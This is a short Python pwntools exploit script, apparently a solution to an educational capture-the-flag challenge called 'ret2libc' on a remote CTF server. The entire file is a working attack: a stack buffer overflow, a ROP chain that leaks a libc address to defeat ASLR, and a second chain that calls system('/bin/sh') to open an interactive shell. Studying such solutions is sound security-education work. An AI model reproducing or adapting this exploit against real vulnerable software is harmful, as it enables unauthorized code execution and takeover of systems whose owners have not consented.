from pwn import *

context.arch = 'amd64'

p = remote('edu-ctf.csie.org', 10175)
# p = process('./ret2libc-70bab0ac586d581ea49f19f64749c7a4')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

main = 0x4006b6
puts_plt = 0x400520
gets_plt = 0x400530
main_got = 0x600ff0
ret = 0x400506

pop_rdi = 0x400733

ropchain = flat(pop_rdi,
        main_got,
        puts_plt,
        pop_rdi,
        0x601800,
        gets_plt,
        main)

raw_input('>')
payload = 'a' * 0x30 + p64(0x601a00) + ropchain
p.sendline(payload)

p.recvuntil(':D\x0a')
libc.address = u64(p.recv(6).ljust(8, '\0')) - 0x21ab0
print('[+] libc: %s' % hex(libc.address))

p.sendline('/bin/sh')

raw_input('>')
ropchain = flat(ret,
        pop_rdi,
        0x601800,
        libc.symbols['system'])
payload = 'a' * 0x30 + 'b' * 0x8 + ropchain
p.sendline(payload)

p.interactive()
